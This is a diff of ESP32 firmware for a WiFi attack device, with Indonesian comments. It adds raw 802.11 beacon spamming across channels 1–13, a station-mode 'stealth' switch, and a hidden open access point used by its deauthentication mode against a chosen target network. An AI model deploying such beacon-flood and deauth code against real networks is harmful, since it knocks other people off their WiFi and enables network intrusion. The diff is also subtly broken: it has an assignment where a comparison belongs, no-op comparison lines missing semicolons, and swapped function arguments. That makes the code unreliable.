@@ -110,13 +110,29 @@ void sendBeacon(const char* ssid) {
     uint8_t postSSID[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 0x01};
     memcpy(&beaconPacket[38 + ssidLen], postSSID, sizeof(postSSID));
 
-    // Tembak pake WIFI_IF_AP sesuai pesanan
+    // TEMBAK PAKE WIFI_IF_STA (Biar gak bentrok sama AP bawaan)
     for (int ch = 1; ch <= 13; ch++) {
         esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
-        esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, 38 + ssidLen + sizeof(postSSID), false);
+        esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, 38 + ssidLen + sizeof(postSSID), false);
         vTaskDelay(pdMS_TO_TICKS(1)); 
     }
 }
+
+// Taruh di atas sebelum fungsi loopWiFi()
+
+// Helper to sanitize SSID (dari GhostESP)
+static void sanitize_ssid(const uint8_t* input_ssid, char* output_buffer, size_t buffer_size) {
+    char temp_ssid[33];
+    memcpy(temp_ssid, input_ssid, 32);
+    temp_ssid[32] = '\0';
+    
+    if (strlen(temp_ssid) == 0) {
+        snprintf(output_buffer, buffer_size, "[Hidden]");
+    } else {
+        snprintf(output_buffer, buffer_size, "%s", temp_ssid);
+    }
+}
+
 
 void loopWiFi(void * pvParameters) {
 
@@ -135,12 +151,16 @@ void loopWiFi(void * pvParameters) {
 
     for(;;) {
         if (isSpamming) {
+        
             if (!spamUdahSetup) {
-                // Diubah ke AP sekalian biar sinkron
-                esp_wifi_stop(); 
-                esp_wifi_set_mode(WIFI_MODE_AP); 
+               esp_wifi_stop(); 
+                
+                // === UBAH KE STA BIAR ESP32 SILUMAN ===
+                esp_wifi_set_mode(WIFI_MODE_STA); 
                 esp_wifi_start();
                 esp_wifi_set_promiscuous(true);
+                esp_wifi_set_ps(WIFI_PS_NONE); // Matiin power save
+                
                 spamUdahSetup = true;
             }
             if (aktifModeSpam == 1) {
@@ -156,6 +176,68 @@ void loopWiFi(void * pvParameters) {
             }
             vTaskDelay(pdMS_TO_TICKS(50)); 
         } 
+       // Di dalam loopWiFi
+else if (triggerConnect) {
+    statusKoneksi = 0; // Set ke status "Connecting"
+    appMode = 10;      // Paksa layar pindah ke status koneksi
+    
+    esp_wifi_stop();
+    esp_wifi_set_mode(WIFI_MODE_STA);
+    esp_wifi_start();
+    
+    wifi_config_t sta_config = {0};
+    strncpy((char*)sta_config.sta.ssid, targetTerkunci.ssid, 32);
+    strncpy((char*)sta_config.sta.password, inputPassword, 64);
+    
+    esp_wifi_set_config(WIFI_IF_STA, &sta_config);
+    
+    // Proses konek
+    if (esp_wifi_connect() == ESP_OK) {
+        // Tunggu bentar buat mastiin dapet IP
+        vTaskDelay(pdMS_TO_TICKS(2000)); 
+        isWiFiConnected = true;
+        statusKoneksi = 1; // Berhasil
+    } else {
+        isWiFiConnected = false;
+        statusKoneksi = 2; // Gagal
+    }
+    
+    triggerConnect = false;
+    
+    // Kasih waktu 3 detik biar lu bisa baca statusnya, baru balik ke menu
+    vTaskDelay(pdMS_TO_TICKS(3000));
+    appMode = 0; // Balik ke menu utama
+}
+
+
+        if (triggerDisconnect) {
+            statusKoneksi = 3; // Set ke status "Disconnecting"
+            appMode = 12;      // Pindah ke layar status
+            
+            esp_wifi_disconnect();
+            esp_wifi_stop(); // Matiin radionya biar bersih
+            
+            // RESET SEMUA STATUS KONEKSI
+            isWiFiConnected = false;
+            memset(connSSID, 0, sizeof(connSSID));
+            connRSSI = 0;
+            connCH = 0;
+            inputPassword[0] = '\0'; // Hapus password yang tadi diketik
+            
+            vTaskDelay(pdMS_TO_TICKS(1500)); // Animasi disconnecting bentar
+            
+            statusKoneksi = 4; // Set ke status "Disconnected"
+            triggerDisconnect = false;
+
+            vTaskDelay(pdMS_TO_TICKS(2000)); // Tahan 2 detik biar kebaca
+            
+            // KEMBALI KE MENU UTAMA
+            appMode = 0; 
+            inSubMenu = true; // Langsung masuk ke list menu WiFi
+        }
+
+
+
         else if (triggerScan) {
             sedang_scan = true;
             adaTarget = false;        
@@ -182,9 +264,16 @@ void loopWiFi(void * pvParameters) {
             
             for (int i = 0; i < totalWiFi; i++) {
                 listWiFi[i].id = i;
-                strncpy(listWiFi[i].ssid, (char*)ap_records[i].ssid, 32);
+                sanitize_ssid(listWiFi[i].ssid, (char*)ap_records[i].ssid, 32);
                 listWiFi[i].rssi = ap_records[i].rssi;
                 listWiFi[i].channel = ap_records[i].primary;
+                if (ap_records[i].authmode = WIFI_AUTH_OPEN) {
+                listWiFi[i].is_open == true
+                strcpy(listWiFi[i].encrypt, "Open");
+                } else { 
+                listWiFi[i].is_open == false
+                strcpy(listWiFi[i].encrypt, "WPA2 / WPA3");
+                }
                 // Format MAC Address manual
                 sprintf(listWiFi[i].mac, "%02x:%02x:%02x:%02x:%02x:%02x",
                         ap_records[i].bssid[0], ap_records[i].bssid[1],
@@ -227,6 +316,17 @@ void loopWiFi(void * pvParameters) {
             if (!deauthUdahSetup) {
                 esp_wifi_stop();
                 esp_wifi_set_mode(WIFI_MODE_AP); 
+                wifi_config_t ap_config = {
+                    .ap = {
+                        .ssid = "Rumah Pak RT", // Ganti nama terserah lu
+                        .ssid_len = strlen("Rumah Pak RT"),
+                        .channel = targetTerkunci.channel,
+                        .authmode = WIFI_AUTH_OPEN,
+                        .max_connection = 1,
+                        .ssid_hidden = 1, // <--- INI KUNCINYA, COK! (1 = Tersembunyi)
+                    },
+                };
+                esp_wifi_set_config(WIFI_IF_AP, &ap_config);
                 esp_wifi_start();
                 esp_wifi_set_promiscuous(true);
                 esp_wifi_set_ps(WIFI_PS_NONE); 
@@ -264,12 +364,23 @@ void loopWiFi(void * pvParameters) {
             vTaskDelay(pdMS_TO_TICKS(1));
         }
 
-
+            
         else if (isDeauthing && adaTarget) {
             if (!deauthUdahSetup) {
                 esp_wifi_stop();
                 // === REQ LU: UBAH KE AP ===
                 esp_wifi_set_mode(WIFI_MODE_AP); 
+                wifi_config_t ap_config = {
+                    .ap = {
+                        .ssid = "Rumah Pak RT", // Ganti nama terserah lu
+                        .ssid_len = strlen("Rumah Pak RT"),
+                        .channel = targetTerkunci.channel,
+                        .authmode = WIFI_AUTH_OPEN,
+                        .max_connection = 1,
+                        .ssid_hidden = 1, // <--- INI KUNCINYA, COK! (1 = Tersembunyi)
+                    },
+                };
+                esp_wifi_set_config(WIFI_IF_AP, &ap_config);
                 esp_wifi_start();
                 esp_wifi_set_promiscuous(true);
                 esp_wifi_set_ps(WIFI_PS_NONE); 
